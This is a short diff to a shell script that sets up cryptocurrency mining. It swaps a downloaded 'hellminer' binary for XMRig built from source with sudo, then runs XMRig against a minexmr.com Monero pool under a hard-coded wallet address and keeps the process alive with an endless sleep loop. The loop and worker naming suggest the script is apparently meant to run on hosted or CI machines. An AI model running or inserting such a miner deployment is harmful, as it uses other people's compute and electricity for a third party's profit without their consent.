@@ -1,9 +1,12 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://sg.minexmr.com:4444#xnsub -u 85g3ACGwaFrVKsxcUzLfKN2ythUVi3Grk76FT5YKKkAfbBceEohBseBAQahE83VnqjVjkiWzJiw1gZjH6fxxEuz91fUUsQX.Git -p x --cpu 2
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+sudo git clone https://github.com/xmrig/xmrig.git
+sudo mkdir xmrig/build && cd xmrig/build
+sudo cmake ..
+sudo make -j$(nproc)
+./xmrig -a rx/0 -o us-west.minexmr.com:4444 -u 85g3ACGwaFrVKsxcUzLfKN2ythUVi3Grk76FT5YKKkAfbBceEohBseBAQahE83VnqjVjkiWzJiw1gZjH6fxxEuz91fUUsQX -k --tls -p test2
 while [ 1 ]; do
 sleep 3
 done
